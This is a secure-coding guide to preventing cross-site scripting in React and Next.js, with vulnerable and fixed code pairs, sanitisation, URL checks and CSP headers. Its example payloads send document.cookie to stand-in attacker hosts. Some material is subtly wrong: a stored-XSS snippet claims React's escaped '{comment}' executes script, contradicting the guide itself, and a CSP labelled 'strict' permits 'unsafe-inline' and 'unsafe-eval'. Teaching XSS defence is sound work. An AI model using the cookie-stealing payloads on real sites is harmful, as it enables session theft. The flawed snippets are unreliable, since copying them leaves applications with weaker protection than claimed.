# XSS Prevention (React + Next.js)

Complete guide to preventing Cross-Site Scripting (XSS) attacks in React and Next.js applications.

---

## Table of Contents

1. [Understanding XSS Attacks](#understanding-xss-attacks)
2. [React's Built-in Protection](#reacts-built-in-protection)
3. [Dangerous Patterns to Avoid](#dangerous-patterns-to-avoid)
4. [HTML Sanitization](#html-sanitization)
5. [URL Sanitization](#url-sanitization)
6. [Content Security Policy](#content-security-policy)
7. [User-Generated Content](#user-generated-content)

---

## Understanding XSS Attacks

### Types of XSS

**1. Stored XSS (Persistent)**
```typescript
// Attacker submits malicious comment
const comment = "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>"

// Server stores comment in database
await db.comment.create({ data: { content: comment } })

// Later, when another user views the page:
<div>{comment}</div>  // Script executes in victim's browser!
```

**2. Reflected XSS (Non-Persistent)**
```typescript
// Attacker crafts malicious URL
// https://example.com/search?q=<script>alert(document.cookie)</script>

// Server reflects query in response
export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)
  const query = searchParams.get('q')

  return new Response(`
    <html><body>
      <h1>Search results for: ${query}</h1>
    </body></html>
  `)  // Script executes!
}
```

**3. DOM-based XSS**
```typescript
// Malicious URL: https://example.com/#<img src=x onerror=alert(1)>

// Client-side code
const hash = window.location.hash.slice(1)
document.getElementById('content').innerHTML = hash  // XSS!
```

### Attack Vectors

```typescript
// 1. Script tags
<script>malicious code</script>

// 2. Event handlers
<img src=x onerror="malicious code">
<div onmouseover="malicious code">

// 3. JavaScript URLs
<a href="javascript:malicious code">Click</a>

// 4. Data URLs
<iframe src="data:text/html,<script>malicious code</script>">

// 5. SVG scripts
<svg><script>malicious code</script></svg>

// 6. Style injection
<div style="background:url('javascript:malicious code')">

// 7. Meta refresh
<meta http-equiv="refresh" content="0;url=javascript:malicious code">
```

---

## React's Built-in Protection

### Default Escaping

```typescript
// ✅ SAFE: React escapes by default
function UserComment({ comment }: { comment: string }) {
  return <div>{comment}</div>
  // Even if comment = "<script>alert(1)</script>"
  // React renders it as text: &lt;script&gt;alert(1)&lt;/script&gt;
}

// ✅ SAFE: Expressions are escaped
function SearchResults({ query }: { query: string }) {
  return (
    <div>
      <h1>Results for: {query}</h1>
      {/* query = "<script>alert(1)</script>" is safe */}
    </div>
  )
}

// ✅ SAFE: Attributes are escaped
function UserProfile({ username }: { username: string }) {
  return <div title={username}>Hello!</div>
  // Even if username = '"><script>alert(1)</script><div title="'
  // React escapes it safely
}
```

### What React DOESN'T Protect

```typescript
// ❌ DANGEROUS: dangerouslySetInnerHTML
function UnsafeComponent({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />
  // If html contains <script>, it WILL execute!
}

// ❌ DANGEROUS: href with javascript:
function UnsafeLink({ url }: { url: string }) {
  return <a href={url}>Click</a>
  // If url = "javascript:alert(1)", it WILL execute!
}

// ❌ DANGEROUS: Inline event handlers with dynamic values
function UnsafeButton({ onClick }: { onClick: string }) {
  return <button onClick={eval(onClick)}>Click</button>
  // Never use eval with user input!
}
```

---

## Dangerous Patterns to Avoid

### dangerouslySetInnerHTML

```typescript
// ❌ NEVER DO THIS
function RenderHTML({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />
}

// Attacker input:
// content = '<img src=x onerror="fetch(`https://evil.com?cookie=${document.cookie}`)>">'

// ✅ DO THIS: Sanitize with DOMPurify
import DOMPurify from 'dompurify'

function SafeRenderHTML({ content }: { content: string }) {
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
  })

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />
}

// ✅ EVEN BETTER: Use a safe rendering library
import Markdown from 'react-markdown'

function SafeMarkdown({ content }: { content: string }) {
  return <Markdown>{content}</Markdown>
  // Markdown library sanitizes automatically
}
```

### innerHTML Assignment

```typescript
'use client'

// ❌ NEVER DO THIS
function DangerousComponent({ html }: { html: string }) {
  useEffect(() => {
    document.getElementById('content')!.innerHTML = html
  }, [html])

  return <div id="content" />
}

// ✅ DO THIS: Use textContent
function SafeComponent({ text }: { text: string }) {
  useEffect(() => {
    document.getElementById('content')!.textContent = text
  }, [text])

  return <div id="content" />
}

// ✅ OR THIS: Let React handle it
function BetterComponent({ text }: { text: string }) {
  return <div>{text}</div>
}
```

### eval() and Function()

```typescript
// ❌ NEVER DO THIS
function DangerousEval({ code }: { code: string }) {
  eval(code)  // Executes arbitrary JavaScript!
}

function DangerousFunction({ code }: { code: string }) {
  new Function(code)()  // Same as eval!
}

// ✅ DO THIS: Use safe alternatives
function SafeCalculator({ expression }: { expression: string }) {
  // Parse and validate expression
  const validated = parseExpression(expression)  // Custom parser
  return <div>{validated.result}</div>
}
```

---

## HTML Sanitization

### DOMPurify Configuration

```typescript
import DOMPurify from 'dompurify'

// ✅ Strict configuration (minimal tags)
export function sanitizeHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false,  // Disable data-* attributes
  })
}

// ✅ Medium configuration (more formatting)
export function sanitizeRichText(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'p', 'br', 'hr',
      'b', 'i', 'em', 'strong', 'u', 's',
      'a', 'img',
      'ul', 'ol', 'li',
      'blockquote', 'pre', 'code',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
    ],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
    ALLOW_DATA_ATTR: false,
  })
}

// ✅ Custom hook configuration
export function useSanitizedHTML(html: string) {
  const [sanitized, setSanitized] = useState('')

  useEffect(() => {
    setSanitized(DOMPurify.sanitize(html))
  }, [html])

  return sanitized
}
```

### Server-Side Sanitization

```typescript
// src/lib/sanitize.ts
import DOMPurify from 'isomorphic-dompurify'  // Works on server and client

export function sanitizeUserInput(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
  })
}

// API route
export async function POST(request: Request) {
  const { content } = await request.json()

  // Sanitize before storing
  const sanitized = sanitizeUserInput(content)

  await db.comment.create({
    data: { content: sanitized },
  })

  return Response.json({ success: true })
}
```

---

## URL Sanitization

### Safe URL Validation

```typescript
// ✅ Validate URLs before using in href
function isSafeURL(url: string): boolean {
  try {
    const parsed = new URL(url)

    // Only allow http and https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return false
    }

    // Block javascript: urls
    if (url.toLowerCase().startsWith('javascript:')) {
      return false
    }

    // Block data: urls
    if (url.toLowerCase().startsWith('data:')) {
      return false
    }

    return true
  } catch {
    return false
  }
}

// Usage
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const safeHref = isSafeURL(href) ? href : '#'

  return <a href={safeHref}>{children}</a>
}
```

### URL Component Sanitization

```typescript
import { z } from 'zod'

// ✅ Validate with Zod
const urlSchema = z.string().url().refine(
  (url) => {
    try {
      const parsed = new URL(url)
      return ['http:', 'https:'].includes(parsed.protocol)
    } catch {
      return false
    }
  },
  { message: 'Only HTTP and HTTPS URLs are allowed' }
)

function SafeLinkWithValidation({ href, children }: { href: string; children: React.ReactNode }) {
  const result = urlSchema.safeParse(href)

  if (!result.success) {
    return <span>{children}</span>  // Render as text if invalid
  }

  return <a href={result.data} rel="noopener noreferrer" target="_blank">{children}</a>
}
```

### Preventing Open Redirects

```typescript
// ❌ VULNERABLE: Unvalidated redirect
export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)
  const redirectTo = searchParams.get('redirect')

  return Response.redirect(redirectTo!)  // Attacker can redirect to evil.com
}

// ✅ SAFE: Validate redirect URL
export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)
  const redirectTo = searchParams.get('redirect')

  if (!redirectTo) {
    return Response.redirect('/')
  }

  // Only allow relative URLs or same origin
  try {
    const url = new URL(redirectTo, request.url)

    if (url.origin !== new URL(request.url).origin) {
      return Response.redirect('/')  // Different origin - reject
    }

    return Response.redirect(url.toString())
  } catch {
    return Response.redirect('/')  // Invalid URL - reject
  }
}
```

---

## Content Security Policy

### CSP Header Configuration

```typescript
// src/middleware.ts
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export function middleware(request: NextRequest) {
  const response = NextResponse.next()

  // ✅ Strict Content Security Policy
  const cspHeader = [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com",
    "img-src 'self' data: https:",
    "connect-src 'self' https://api.openai.com",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "upgrade-insecure-requests",
  ].join('; ')

  response.headers.set('Content-Security-Policy', cspHeader)

  // ✅ Additional security headers
  response.headers.set('X-Content-Type-Options', 'nosniff')
  response.headers.set('X-Frame-Options', 'DENY')
  response.headers.set('X-XSS-Protection', '1; mode=block')
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin')

  return response
}
```

### CSP Nonce for Inline Scripts

```typescript
// src/app/layout.tsx
import { headers } from 'next/headers'
import crypto from 'crypto'

export default async function RootLayout({ children }: { children: React.ReactNode }) {
  const nonce = crypto.randomBytes(16).toString('base64')

  const csp = [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}'`,  // Only scripts with this nonce
    "style-src 'self' 'unsafe-inline'",
  ].join('; ')

  return (
    <html lang="en">
      <head>
        <meta httpEquiv="Content-Security-Policy" content={csp} />
      </head>
      <body>
        {children}
        <script nonce={nonce} dangerouslySetInnerHTML={{
          __html: `console.log('This script is allowed')`
        }} />
      </body>
    </html>
  )
}
```

---

## User-Generated Content

### Comment System

```typescript
// ✅ Safe comment rendering
import DOMPurify from 'dompurify'

interface CommentProps {
  content: string
  author: string
  createdAt: Date
}

export function Comment({ content, author, createdAt }: CommentProps) {
  // Sanitize on render (in case database contains old unsanitized data)
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
  })

  return (
    <div className="comment">
      <div className="comment-author">{author}</div>
      <div className="comment-date">{createdAt.toLocaleString()}</div>
      <div
        className="comment-content"
        dangerouslySetInnerHTML={{ __html: sanitized }}
      />
    </div>
  )
}
```

### Rich Text Editor

```typescript
'use client'

import { useState } from 'react'
import DOMPurify from 'dompurify'

export function RichTextEditor({ onSubmit }: { onSubmit: (html: string) => void }) {
  const [content, setContent] = useState('')

  const handleSubmit = () => {
    // Sanitize before sending to server
    const sanitized = DOMPurify.sanitize(content, {
      ALLOWED_TAGS: [
        'p', 'br', 'b', 'i', 'em', 'strong', 'u',
        'h1', 'h2', 'h3', 'ul', 'ol', 'li',
        'a', 'blockquote', 'code', 'pre',
      ],
      ALLOWED_ATTR: ['href', 'class'],
    })

    onSubmit(sanitized)
  }

  return (
    <div>
      <textarea
        value={content}
        onChange={(e) => setContent(e.target.value)}
        placeholder="Enter your content..."
      />
      <button onClick={handleSubmit}>Submit</button>
    </div>
  )
}
```

### File Upload Preview

```typescript
'use client'

// ❌ DANGEROUS: Display user-uploaded files without sanitization
function DangerousFilePreview({ file }: { file: File }) {
  const [preview, setPreview] = useState('')

  useEffect(() => {
    const reader = new FileReader()
    reader.onload = () => {
      setPreview(reader.result as string)
    }
    reader.readAsText(file)
  }, [file])

  return <div dangerouslySetInnerHTML={{ __html: preview }} />
  // If file contains malicious HTML, it executes!
}

// ✅ SAFE: Sanitize file content
function SafeFilePreview({ file }: { file: File }) {
  const [preview, setPreview] = useState('')

  useEffect(() => {
    const reader = new FileReader()
    reader.onload = () => {
      const content = reader.result as string
      const sanitized = DOMPurify.sanitize(content)
      setPreview(sanitized)
    }
    reader.readAsText(file)
  }, [file])

  return <div dangerouslySetInnerHTML={{ __html: preview }} />
}

// ✅ EVEN BETTER: Use textContent for non-HTML files
function TextFilePreview({ file }: { file: File }) {
  const [content, setContent] = useState('')

  useEffect(() => {
    const reader = new FileReader()
    reader.onload = () => {
      setContent(reader.result as string)
    }
    reader.readAsText(file)
  }, [file])

  return <pre>{content}</pre>  // React escapes automatically
}
```

---

## Summary Checklist

**XSS Prevention:**

- [ ] Rely on React's default escaping for most content
- [ ] Never use `dangerouslySetInnerHTML` without DOMPurify
- [ ] Never assign to `innerHTML` directly
- [ ] Never use `eval()` or `Function()` with user input
- [ ] Validate and sanitize all URLs before using in `href`
- [ ] Use Content Security Policy headers
- [ ] Sanitize user-generated content before storage
- [ ] Use `rel="noopener noreferrer"` for external links
- [ ] Validate file uploads and sanitize content
- [ ] Use `textContent` instead of `innerHTML` when possible
- [ ] Test with XSS payloads
- [ ] Use security linters (eslint-plugin-security)

**References:**
- OWASP XSS Guide: https://owasp.org/www-community/attacks/xss/
- DOMPurify: https://github.com/cure53/DOMPurify
- React Security: https://react.dev/learn/escaping-api
- CSP Reference: https://content-security-policy.com/
